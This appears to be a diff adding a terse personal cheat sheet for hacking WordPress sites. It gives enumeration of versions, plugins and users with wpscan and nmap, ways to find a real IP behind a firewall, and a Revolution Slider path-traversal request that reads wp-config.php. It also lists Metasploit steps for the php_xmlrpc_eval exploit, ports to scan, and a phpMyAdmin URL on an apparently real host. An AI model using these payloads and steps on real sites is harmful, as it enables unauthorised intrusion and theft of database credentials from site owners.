@@ -1,0 +1,66 @@
+
+
+get wordpress version---------------+
+search for name="generator"
+go to the /readme.html file
+****************************************************************
+enumerate plugins and themes---------------+
+go the /wp-content/plugins/plugin_name/readme.txt
+	/wp-content/themes/name/readme.txt
+brute force different plugin names to see which one is available depending on the response
+**********************************************************************
+enumerate authors---------------+
+get usernames using wpscan
+wpscan –url *target IP* –enumerate u
+enumerate the admins using the author parameters
+brute force multiple authors and check the response
+http://wordpressexample.com/?author=1 
+go the users directory /wp-json/wp/v2/users
+enumerate users with burpsuite
+nmap -sV --script http-wordpress-enum --script-args limit=25 
+***********************************************************************
+find real ip benind firewall---------------+
+using historical DNS records
+using mx records
+using txt or SPF records
+using Historical TLS / SSL searches
+
+----wordpress Site Hacking By Config php File----
+gain admin access to the phpmyadmin server---------------+
+URL: 	https://www.youtube.com/watch?v=QIEFPmxrHsQ
+/wp-admin/admin-ajax.php?action-revslider_show_image&img=../wp-config.php
+
+*************************************************************************************
+PHP XML-RPC Arbitrary Code Execution VIA xmlrpc.php---------------+
+https://www.rapid7.com/db/modules/exploit/unix/webapp/php_xmlrpc_eval/
+
+msf > use exploit/unix/webapp/php_xmlrpc_eval
+msf exploit(php_xmlrpc_eval) > show targets
+    ...targets...
+msf exploit(php_xmlrpc_eval) > set TARGET < target-id >
+msf exploit(php_xmlrpc_eval) > show options
+    ...show and set options...
+msf exploit(php_xmlrpc_eval) > exploit
+
+****************************************************************************
+csrf via hotlinking
+https://www.gnucitizen.org/blog/persistent-csrf-and-the-hotlink-hell/
+
+*********************************************
+port scanning ---------------+
+mysql 3306
+cpanel 2082/2083
+webmin 10000
+ftp 21
+ssh 22
+8080/8888
+*********************************************
+
+
+*********************************
+Database has defalt name ---------------+
+https://ds23.dnsloader.com:2083/cpsess8785471234/3rdparty/phpMyAdmin/index.php?db=whitehat_wp800
+
+
+
+/wp-login.php?action=register or /wp-admin?action=register
